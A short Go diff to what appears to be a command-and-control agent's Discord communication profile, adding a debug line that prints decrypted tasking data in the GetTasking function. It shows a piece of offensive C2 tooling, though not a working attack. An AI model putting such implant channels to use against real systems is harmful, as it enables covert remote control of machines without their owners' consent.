@@ -418,6 +418,7 @@ func (d *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []struct
 	}
 
 	// Parse the decrypted response
+	fmt.Fprintf(os.Stderr, "[discord] GetTasking: decrypted %d bytes: %s\n", len(decryptedData), string(decryptedData[:min(300, len(decryptedData))]))
 	var taskResponse map[string]interface{}
 	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
 		fmt.Fprintf(os.Stderr, "[discord] GetTasking: json parse error: %v data=%s\n", err, string(decryptedData[:min(200, len(decryptedData))]))
